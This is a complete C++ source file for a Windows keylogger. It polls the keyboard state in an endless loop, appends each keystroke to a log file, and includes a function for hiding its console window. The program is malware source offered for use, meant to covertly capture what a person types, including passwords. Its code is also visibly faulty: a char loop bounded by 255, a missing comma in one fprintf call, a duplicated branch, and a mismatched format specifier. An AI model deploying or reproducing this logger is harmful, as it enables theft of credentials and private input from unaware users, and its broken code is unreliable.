#define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output folder location
#include <iostream>
#include <cstdio>
#include <Windows.h>
#include <time.h>
#include <fstream>
void hideConsole();
void showConsole();
void saveToFile(int key_ascii);

int main()
{
	showConsole();
	while (true)
	{
		Sleep(20);
		for (char i = 8; i <= 255; i++)
			if (GetAsyncKeyState(i) == -32767) // catch keystrokes
				saveToFile(i);
	}
}

void saveToFile(int key_ascii)
{
	Sleep(20);
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(PATH, "a+");
	if (OUTPUT_FILE == NULL)
	{
		showConsole();
		std::cout << "Error: cannot open file " << PATH;
	}

	else if (key_ascii == VK_ESCAPE)
		exit(1);
	else if (key_ascii == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_ascii == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (key_ascii == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (key_ascii == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_ascii == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s" "[DELETE]");
	else if (key_ascii == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_ascii == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else
		fprintf(OUTPUT_FILE, "%s", &key_ascii);
	fclose(OUTPUT_FILE);
}

void hideConsole()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void showConsole()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}